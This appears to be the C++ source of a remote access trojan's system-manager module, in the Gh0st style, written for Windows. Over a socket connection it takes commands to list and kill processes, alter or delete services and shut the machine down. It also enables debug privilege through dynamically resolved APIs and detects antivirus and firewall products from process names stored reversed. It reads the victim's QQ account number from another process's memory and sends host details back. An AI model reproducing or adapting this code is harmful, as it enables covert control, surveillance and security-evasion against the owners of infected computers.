// MySystemManager.cpp: implementation of the CMySystemManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "MySystemManager.h"
#include "svc.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <tchar.h>
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Psapi.lib")
#pragma comment(lib,"advapi32.lib")

#include "until.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMySystemManager::CMySystemManager(CClientSocket *pClient) : CManager(pClient)
{
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	SendProcessList();
}

CMySystemManager::~CMySystemManager()
{
}

LPBYTE CMySystemManager::getWindowsList()
{
	LPBYTE lpBuffer = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;
}

void CMySystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	SwitchInputDesktop();

	LPBYTE temp = NULL;
	switch (lpBuffer[0])
	{
	case COMMAND_PSLIST:
		SendProcessList();
		break;
	case COMMAND_WSLIST:
		SendWindowsList();
		break;
	case COMMAND_SVLIST:
		SendServicesList();
		break;
	case COMMAND_KILLPROCESS:
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_SERVICE_AUTOSTART:
		SetServiceStartType((LPBYTE)lpBuffer + 1, COMMAND_SERVICE_AUTOSTART);
		break;
	case COMMAND_SERVICE_DEMANDSTART:
		SetServiceStartType((LPBYTE)lpBuffer + 1, COMMAND_SERVICE_DEMANDSTART);
		break;
	case COMMAND_SERVICE_DISABLE:
		SetServiceStartType((LPBYTE)lpBuffer + 1, COMMAND_SERVICE_DISABLE);
		break;
	case COMMAND_SERVICE_START:
		temp = (LPBYTE)(lpBuffer + 1);
		LxStartService((TCHAR*)temp);
		Sleep(1000);
		SendServicesList();
		break;
	case COMMAND_SERVICE_STOP:
		temp = (LPBYTE)(lpBuffer + 1);
		LxStopService((TCHAR*)temp, 5);
		Sleep(1000);
		SendServicesList();
		break;
	case COMMAND_SYSINFOLIST:
		SendSysInfo();
		break;
	default:
		break;
	}
}

void CMySystemManager::SendProcessList()
{
	UINT nRet = -1;
	LPBYTE lpBuffer = getProcessList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CMySystemManager::SendWindowsList()
{
	UINT nRet = -1;
	LPBYTE lpBuffer = getWindowsList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CMySystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
{
	HANDLE hProcess = NULL;

	for (UINT i = 0; i < nSize; i += 4)
	{
		hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, *(LPDWORD)(lpBuffer + i));
		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}

	Sleep(150);
	// 刷新进程列表
	SendProcessList();
	// 刷新窗口列表
	SendWindowsList();
}

BOOL IsX64System()
{
	BOOL bIsWow64 = FALSE;

	typedef BOOL(WINAPI *ISWOW64PROCESS)(HANDLE, PBOOL);
	ISWOW64PROCESS pfnIsWow64 = (ISWOW64PROCESS)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "IsWow64Process");
	if (pfnIsWow64)
	{
		if (!pfnIsWow64(GetCurrentProcess(), &bIsWow64))
		{
			// handle error
		}
	}

	return bIsWow64;
}

LPBYTE CMySystemManager::getProcessList()
{
	HANDLE			hSnapshot = NULL;
	HANDLE			hProcess = NULL;
	HMODULE			hModules = NULL;
	PROCESSENTRY32	pe32 = { 0 };
	DWORD			cbNeeded;
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;
	TCHAR			strProcessName[MAX_PATH] = { 0 };

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);

	lpBuffer[0] = TOKEN_PSLIST;
	dwOffset = 1;

	typedef BOOL(WINAPI *QueryFullProcessImageName) (HANDLE hProcess, DWORD dwFlags, LPTSTR lpExeName, PDWORD lpdwSize);
	QueryFullProcessImageName LxQueryFullProcessImageName = (QueryFullProcessImageName)GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), "QueryFullProcessImageNameW");
	if (LxQueryFullProcessImageName == NULL)
	{
		LxQueryFullProcessImageName = (QueryFullProcessImageName)GetProcAddress(LoadLibraryW(L"Psapi.dll"), "GetModuleFileNameExA");
	}

	if (Process32First(hSnapshot, &pe32))
	{
		do
		{
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);

			DWORD StrLength = 260;
			LxQueryFullProcessImageName(hProcess, 0, strProcessName, &StrLength);

			dwLength = sizeof(DWORD) + (lstrlen(pe32.szExeFile) + lstrlen(strProcessName) + 2) * sizeof(TCHAR);

			if (LocalSize(lpBuffer) < (dwOffset + dwLength))
				lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

			memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
			dwOffset += sizeof(DWORD);

			memcpy(lpBuffer + dwOffset, (TCHAR*)pe32.szExeFile, (lstrlen(pe32.szExeFile) + 1)*sizeof(TCHAR));
			dwOffset += (lstrlen(pe32.szExeFile) + 1)*sizeof(TCHAR);

			memcpy(lpBuffer + dwOffset, (TCHAR*)strProcessName, (lstrlen(strProcessName) + 1)*sizeof(TCHAR));
			dwOffset += (lstrlen(strProcessName) + 1)*sizeof(TCHAR);
		} while (Process32Next(hSnapshot, &pe32));
	}

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);

	CloseHandle(hProcess);
	CloseHandle(hSnapshot);

	return lpBuffer;
}

bool CMySystemManager::DebugPrivilege(const TCHAR *PName, BOOL bEnable)
{
	bool              bResult = TRUE;

	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;

	HINSTANCE advapi32 = GetModuleHandleW(L"ADVAPI32.dll");

	typedef BOOL(WINAPI *OPT)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);

	OPT myopt = (OPT)GetProcAddress(advapi32, "OpenProcessToken");

	if (!myopt(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	typedef BOOL(WINAPI *LPV)(LPCTSTR lpSystemName, LPCTSTR lpName, PLUID lpLuid);

#ifdef UNICODE
	LPV mylpv = (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueW");
#else
	LPV mylpv = (LPV)GetProcAddress(advapi32, "LookupPrivilegeValueA");
#endif

	mylpv(NULL, PName, &TokenPrivileges.Privileges[0].Luid);

	typedef BOOL(WINAPI *ATP)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
	ATP myapt = (ATP)GetProcAddress(advapi32, "AdjustTokenPrivileges");

	myapt(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

	if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	CloseHandle(hToken);

	return bResult;
}

void CMySystemManager::ShutdownWindows(DWORD dwReason)
{
	DebugPrivilege(SE_SHUTDOWN_NAME, TRUE);
	ExitWindowsEx(dwReason, 0);
}

bool CALLBACK CMySystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	DWORD dwLength = 0;
	DWORD dwOffset = 0;
	DWORD dwProcessID = 0;
	LPBYTE lpBuffer = *(LPBYTE *)lParam;

	TCHAR strTitle[512];
	memset(strTitle, 0, sizeof(strTitle));

	DWORD pid;
	GetWindowThreadProcessId(hwnd, &pid);

	if (pid == GetCurrentProcessId()) return true;

	GetWindowText(hwnd, strTitle, sizeof(strTitle));

	if (!IsWindowVisible(hwnd) || strTitle[0] == '0')
		return true;

	if (lpBuffer == NULL)
		lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);

	dwLength = sizeof(DWORD) + (lstrlen(strTitle) + 1)*sizeof(TCHAR);
	dwOffset = LocalSize(lpBuffer);

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT | LMEM_MOVEABLE);

	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD), (TCHAR*)strTitle, (lstrlen(strTitle) + 1)*sizeof(TCHAR));

	*(LPBYTE *)lParam = lpBuffer;

	return true;
}

LPBYTE CMySystemManager::GetServiceList()
{
	SC_HANDLE hSCM = NULL, hService = NULL;
	DWORD dwBytesNeeded = 0, dwServicesReturned = 0, dwResume = 0, dwOffset = 1, dwLength = 0;

	LPBYTE lpBuffer = NULL;

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024 * 64);
	lpBuffer[0] = TOKEN_SVLIST;

	hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS | SC_MANAGER_ENUMERATE_SERVICE);

	ENUM_SERVICE_STATUS Services;
	EnumServicesStatus(hSCM, SERVICE_WIN32, SERVICE_STATE_ALL, &Services, sizeof(Services), &dwBytesNeeded, &dwServicesReturned, &dwResume);

	DWORD dwBufSize = dwBytesNeeded;
	LPENUM_SERVICE_STATUS lpServices = (LPENUM_SERVICE_STATUS)LocalAlloc(LPTR, dwBufSize);

	EnumServicesStatus(hSCM, SERVICE_WIN32, SERVICE_STATE_ALL, lpServices, dwBufSize, &dwBytesNeeded, &dwServicesReturned, &dwResume);

	for (DWORD dwIndex = 0; dwIndex < dwServicesReturned; dwIndex++)
	{
		hService = OpenService(hSCM, lpServices[dwIndex].lpServiceName, SC_MANAGER_ALL_ACCESS);
		if (hService)
		{
			QUERY_SERVICE_CONFIG emConfig;
			QueryServiceConfig(hService, &emConfig, sizeof(QUERY_SERVICE_CONFIG), &dwBytesNeeded);

			dwLength = (lstrlen(lpServices[dwIndex].lpServiceName) + lstrlen(lpServices[dwIndex].lpDisplayName) + 2)*sizeof(TCHAR) + sizeof(DWORD) + sizeof(DWORD);

			// 缓冲区太小,重新分配下
			if (LocalSize(lpBuffer) < (dwOffset + dwLength))
				lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

			memcpy(lpBuffer + dwOffset, (TCHAR*)lpServices[dwIndex].lpServiceName, (lstrlen(lpServices[dwIndex].lpServiceName) + 1)*sizeof(TCHAR));
			dwOffset += (lstrlen(lpServices[dwIndex].lpServiceName) + 1) * sizeof(TCHAR);

			TCHAR lpSvcDiscription[256], Desc[MAX_PATH];
			//wsprintf(Desc, _T("SYSTEM\\CurrentControlSet\\Services\\%s"), lpServices[dwIndex].lpServiceName);

			//ReadRegSz(HKEY_LOCAL_MACHINE, Desc, _T("Description"), (TCHAR*)lpSvcDiscription, sizeof(lpSvcDiscription));

			lstrcpy(lpSvcDiscription, emConfig.lpBinaryPathName);

			memcpy(lpBuffer + dwOffset, (TCHAR*)lpSvcDiscription, (lstrlen(lpSvcDiscription) + 1)*sizeof(TCHAR));
			dwOffset += (lstrlen(lpSvcDiscription) + 1)*sizeof(TCHAR);

			memcpy(lpBuffer + dwOffset, (TCHAR*)lpServices[dwIndex].lpDisplayName, (lstrlen(lpServices[dwIndex].lpDisplayName) + 1)*sizeof(TCHAR));
			dwOffset += (lstrlen(lpServices[dwIndex].lpDisplayName) + 1) * sizeof(TCHAR);

			memcpy(lpBuffer + dwOffset, &(lpServices[dwIndex].ServiceStatus.dwCurrentState), sizeof(DWORD));
			dwOffset += sizeof(DWORD);

			memcpy(lpBuffer + dwOffset, &(emConfig.dwStartType), sizeof(DWORD));
			dwOffset += sizeof(DWORD);
		}

		CloseServiceHandle(hService);
		hService = NULL;
	}

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);
	LocalFree(lpServices);
	CloseServiceHandle(hSCM);

	return lpBuffer;
}

void CMySystemManager::SendServicesList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = GetServiceList();

	if (lpBuffer == NULL)
	{
		return;
	}

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CMySystemManager::SetServiceStartType(LPBYTE lpBuffer, BYTE bToken)
{
	switch (bToken)
	{
	case COMMAND_SERVICE_AUTOSTART:
		ServiceSetStartMode((TCHAR*)lpBuffer, SERVICE_AUTO_START);
		break;

	case COMMAND_SERVICE_DEMANDSTART:
		ServiceSetStartMode((TCHAR*)lpBuffer, SERVICE_DEMAND_START);
		break;

	case COMMAND_SERVICE_DISABLE:
		ServiceSetStartMode((TCHAR*)lpBuffer, SERVICE_DISABLED);
		break;

	case COMMAND_SERVICE_DELETE:
		UninstallService((TCHAR*)lpBuffer);
		break;

	default:
		break;
	}

	Sleep(1000);

	SendServicesList();
}

// typedef struct tagLASTINPUTINFO
// {
// 	UINT cbSize;
// 	DWORD dwTime;
// } LASTINPUTINFO, *PLASTINPUTINFO;

TCHAR szProcAV[19][20] =
{
	_T("exe.cvseva"),
	_T("exe.psidhsa"),
	_T("exe.ccgva"),
	_T("exe.ssdb"),
	_T("exe.redips"),
	_T("exe.pva"),
	_T("exe.nrk23don"),
	_T("exe.lrtcodiwe"),
	_T("exe.dleihscm"),
	_T("exe.serifvap"),
	_T("exe.ppacc"),
	_T("exe.nomtnccp"),
	_T("exe.23mssf"),
	_T("exe.tratsvak"),
	_T("exe.nrke"),
	_T("exe.dnomvar"),
	_T("exe.pxvrsvk"),
	_T("exe.ds063"),
	_T("exe.yart063")
};

TCHAR szNameAV[19][32] =
{
	_T("AntiVir"),
	_T("Avast Antivirus"),
	_T("AVG Antivirus"),
	_T("BitDefender"),
	_T("Dr.Web"),
	_T("Kaspersky Antivirus"),
	_T("Nod32 Antivirus"),
	_T("Ewido Security Suite"),
	_T("McAfee VirusScan"),
	_T("Panda Antivirus/Firewall"),
	_T("Symantec/Norton"),
	_T("PC-cillin Antivirus"),
	_T("F-Secure"),
	_T("Kingsoft Internet Security"),
	_T("NOD32 Antivirus"),
	_T("Rising Antivirus"),
	_T("Jiangmin Antivirus"),
	_T("360 ShaDu"),
	_T("360 Safe")
};

TCHAR szProcFW[12][20] =
{
	_T("exe.cvssi"),
	_T("exe.nomsv"),
	_T("exe.fpc"),
	_T("exe.ac"),
	_T("exe.litubnt"),
	_T("exe.ecivresfpm"),
	_T("exe.tsoptuo"),
	_T("exe.vrspt"),
	_T("exe.serifvap"),
	_T("exe.ss4fpk"),
	_T("exe.vrswfr"),
	_T("exe.praitna")
};

TCHAR szNameFW[12][32] =
{
	_T("Norton Personal Firewall"),
	_T("ZoneAlarm"),
	_T("Comodo Firewall"),
	_T("eTrust EZ Firewall"),
	_T("F-Secure Internet Security"),
	_T("McAfee Personal Firewall"),
	_T("Outpost Personal Firewall"),
	_T("Panda Internet Seciruty Suite"),
	_T("Panda Anti-Virus/Firewall"),
	_T("BitDefnder/Bull Guard Antivirus"),
	_T("Rising Firewall"),
	_T("360Safe AntiArp")
};

#include <commctrl.h>

BOOL CMySystemManager::IsNumeric(TCHAR lpszStr)
{
	if ((47 < (int)lpszStr) && (58 > (int)lpszStr))
		return TRUE;
	else
		return false;
}

LPSTR CMySystemManager::GetQQ(char lpQQBuffer[])
{
	HWND hWnd, hWndTmp;
	unsigned long lngPID;
	long ret, lngButtons;
	HANDLE hProcess;
	LPVOID lngAddress;
	long lngTextAdr;
	WCHAR strBuff[1024] = { 0 };
	CHAR lpQQTemp[MAX_PATH], lpQQ[MAX_PATH], temp[15] = { 0 };

	hWnd = FindWindowA("Shell_TrayWnd", NULL);
	hWnd = FindWindowExA(hWnd, 0, "TrayNotifyWnd", NULL);
	hWndTmp = FindWindowExA(hWnd, 0, "SysPager", NULL);

	if (!hWndTmp)
		hWnd = FindWindowExA(hWnd, 0, "ToolbarWindow32", NULL);
	else
		hWnd = FindWindowExA(hWndTmp, 0, "ToolbarWindow32", NULL);

	ret = GetWindowThreadProcessId(hWnd, &lngPID);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, lngPID);

	lngAddress = VirtualAllocEx(hProcess, 0, 0x4096, MEM_COMMIT, PAGE_READWRITE);//0x02e60000
	lngButtons = SendMessage(hWnd, TB_BUTTONCOUNT, 0, 0);

	for (int i = 0; i < lngButtons - 1; i++)
	{
		SendMessageA(hWnd, TB_GETBUTTON, i, long(lngAddress));
		ret = ReadProcessMemory(hProcess, LPVOID(long(lngAddress) + 16), &lngTextAdr, 4, 0);

		if (lngTextAdr != -1)
		{
			ret = ReadProcessMemory(hProcess, LPVOID(lngTextAdr), strBuff, 1024, 0);

			WideCharToMultiByte(CP_ACP, 0, strBuff, -1, lpQQTemp, sizeof(lpQQTemp), NULL, FALSE);

			lstrcpynA(lpQQ, lpQQTemp, 3);

			if (!lstrcmpiA(lpQQ, "QQ"))
			{
				int len = lstrlenA(lpQQTemp);
				for (int j = 0; j < len; j++)
				{
					if (((int)lpQQTemp[j] == (int)'(') && IsNumeric(lpQQTemp[j + 1]))
					{
						for (int pos = 1; pos < 20; pos++)
						{
							if (!IsNumeric(lpQQTemp[j + pos])) break;
						}

						memcpy((PVOID)temp, (PVOID)&lpQQTemp[j + 1], len - 1);

						lstrcatA(lpQQBuffer, temp);
						lstrcatA(lpQQBuffer, " ");
					}
				}
			}
		}
	}

	VirtualFreeEx(hProcess, lngAddress, 0x4096, MEM_RELEASE);
	CloseHandle(hProcess);
	return lpQQBuffer;
}

void CMySystemManager::GetSystemInfo(tagSystemInfo* pSysInfo)
{
	ZeroMemory(pSysInfo, sizeof(tagSystemInfo));

	TCHAR szSystem[32];
	OSVERSIONINFOEX osvi;
	memset(&osvi, 0, sizeof(osvi));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

	if (GetVersionEx((OSVERSIONINFO *)&osvi))
	{
		switch (osvi.dwPlatformId)
		{
		case VER_PLATFORM_WIN32_NT:
			if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0)
				lstrcpy(szSystem, _T("Windows Vista"));
			else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1)
				lstrcpy(szSystem, _T("WIndows 7"));
			else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 2)
				lstrcpy(szSystem, _T("Windows 8"));
			else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 3)
				lstrcpy(szSystem, _T("Windows 8.1"));
			else if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2)
				lstrcpy(szSystem, _T("Windows 2003"));
			else if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1)
				lstrcpy(szSystem, _T("Windows XP"));
			else if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0)
				lstrcpy(szSystem, _T("Windows 2000"));
			else if (osvi.dwMajorVersion == 10)
				lstrcpy(szSystem, _T("Windows 10"));
			else if (osvi.dwMajorVersion <= 4)
				lstrcpy(szSystem, _T("Windows NT"));
			else
				lstrcpy(szSystem, _T("Windows Unknown"));
			break;
		case VER_PLATFORM_WIN32_WINDOWS:
			if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 0)
				lstrcpy(szSystem, _T("Win 95"));
			if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 10)
				lstrcpy(szSystem, _T("Win 98"));
			break;
		}
		wsprintf(pSysInfo->szSystem, _T("%s SP%d (Build %d)"), szSystem, osvi.wServicePackMajor, osvi.dwBuildNumber);
	}
	else
	{
		lstrcpy(pSysInfo->szSystem, _T("Unknown System"));
	}

	//Get CPU Info===============================
	TCHAR SubKey[MAX_PATH] = _T("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0\0");
	HKEY hKey = NULL;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, SubKey, 0L, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
	{
		DWORD dwType;
		DWORD dwSize = 128 * sizeof(TCHAR);
		RegQueryValueEx(hKey, _T("ProcessorNameString"), NULL, &dwType, (BYTE *)pSysInfo->szCpuInfo, &dwSize);
		RegCloseKey(hKey);
	}
	else
		lstrcpy(pSysInfo->szCpuInfo, _T("Find CPU infomation error"));

	//Get Memory Size============================
	MEMORYSTATUSEX Meminfo;
	double dSize;

	memset(&Meminfo, 0, sizeof(Meminfo));
	Meminfo.dwLength = sizeof(Meminfo);
	GlobalMemoryStatusEx(&Meminfo);

	dSize = (double)(signed __int64)Meminfo.ullTotalPhys;
	dSize /= 1024.0;
	dSize /= 1024.0;
	dSize += 0.5;
	_stprintf(pSysInfo->szMemory, _T("%.0f MB"), dSize);

	//Get Active Time============================
	DWORD dwTime, dwDay, dwHour, dwMin;
	dwTime = GetTickCount();
	dwDay = dwTime / (1000 * 60 * 60 * 24);
	dwTime = dwTime % (1000 * 60 * 60 * 24);
	dwHour = dwTime / (1000 * 60 * 60);
	dwTime = dwTime % (1000 * 60 * 60);
	dwMin = dwTime / (1000 * 60);
	wsprintf(pSysInfo->szActiveTime, _T("%d天 %d小时 %d分钟"), dwDay, dwHour, dwMin);

	//Get Idle Time=============================
	LASTINPUTINFO liInfo;
	int iHour, iMin, iSec;

	liInfo.cbSize = sizeof(LASTINPUTINFO);

	if (GetLastInputInfo(&liInfo))
	{
		iSec = (GetTickCount() - liInfo.dwTime) / 1000;
		iMin = iSec / 60;
		iSec = iSec % 60;
		iHour = iMin / 60;
		iMin = iMin % 60;
		_stprintf(pSysInfo->szIdleTime, _T("%2d:%2d:%2d(hh:mm:ss)"), iHour, iMin, iSec);
	}

	//Get AntiVirus & FireWall========================
	DWORD dwIDProcess[1024], cbNeeded;
	HANDLE  hProcess;
	HMODULE hMod;
	TCHAR szProcName[32] = _T("UnknownProcess");
	if (EnumProcesses(dwIDProcess, sizeof(dwIDProcess), &cbNeeded))//枚举系统进程ID列表
	{
		BOOL bFindKAV = FALSE;

		DWORD dwCount = cbNeeded / sizeof(DWORD);

		for (DWORD i = 0; i < dwCount; i++)
		{
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwIDProcess[i]);
			if (hProcess)
			{
				if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
				{
					GetModuleBaseName(hProcess, hMod, szProcName, sizeof(szProcName));
					_tcsrev(szProcName);//名字取反，好做比较

					for (int j = 0; j < 19; j++)
					{
						if (lstrcmpi(szProcName, szProcAV[j]) == 0)
						{
							if (j == 5)//卡巴的双进程avp.exe，过滤一下
							{
								if (bFindKAV)
									continue;
								else
									bFindKAV = TRUE;
							}
							lstrcat(pSysInfo->szAntiVirus, _T("|"));
							lstrcat(pSysInfo->szAntiVirus, szNameAV[j]);
							break;
						}
					}
					//历遍防火墙列表
					for (int k = 0; k < 12; k++)
					{
						if (lstrcmpi(szProcName, szProcFW[k]) == 0)
						{
							lstrcat(pSysInfo->szFireWall, _T("|"));
							lstrcat(pSysInfo->szFireWall, szNameFW[k]);
							break;
						}
					}
				}
			}
		}
	}

	//Get Computer & User Name
	DWORD dwLen = sizeof(pSysInfo->szPcName);
	GetComputerName(pSysInfo->szPcName, &dwLen);
	dwLen = sizeof(pSysInfo->szUserName);
	GetUserName(pSysInfo->szUserName, &dwLen);

	//Get Screen Size
	wsprintf(pSysInfo->szScrSize, _T("%d * %d"), GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));

	//Get Drives Size
	ULONGLONG totalspace = 0, freespace = 0;
	ULONGLONG ulltotalspace, ullfreespace, freebyte;
	DWORD drivertype;
	TCHAR driver[10];
	for (int i = 0; i < 26; i++)
	{
		driver[0] = i + _T('B');
		driver[1] = _T(':');
		driver[2] = _T('\\');
		driver[3] = 0;

		drivertype = GetDriveType(driver);
		if (drivertype != DRIVE_FIXED)
			continue;

		if (GetDiskFreeSpaceEx(driver,
			(PULARGE_INTEGER)&freebyte,
			(PULARGE_INTEGER)&ulltotalspace,
			(PULARGE_INTEGER)&ullfreespace))
		{
			totalspace += ulltotalspace;
			freespace += ullfreespace;
		}
	}

	double dfreespace = 0.0, dtotalspace = 0.0;
	dfreespace = (signed __int64)(freespace / (1024 * 1024 * 1024));
	dtotalspace = (signed __int64)(totalspace / (1024 * 1024 * 1024));
	_stprintf(pSysInfo->szDriveSize, _T("总磁盘空间为:%.2fG,剩余磁盘空间为:%.2fG"), dtotalspace, dfreespace);

	char mbQQ[256];
	GetQQ(mbQQ);
	TCHAR wcQQ[MAX_PATH];
	MultiByteToWideChar(CP_ACP, 0, mbQQ, -1, wcQQ, sizeof(wcQQ) / sizeof(wcQQ[0]));
	wsprintf(pSysInfo->szQqNum, _T("当前登录QQ号码是: %s"), wcQQ);
}

void CMySystemManager::SendSysInfo()
{
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 2048);
	lpBuffer[0] = TOKEN_SYSINFOLIST;

	tagSystemInfo m_SysInfo;
	GetSystemInfo(&m_SysInfo);

	memcpy(lpBuffer + 1, &m_SysInfo, sizeof(tagSystemInfo));

	Send(lpBuffer, LocalSize(lpBuffer));

	LocalFree(lpBuffer);
}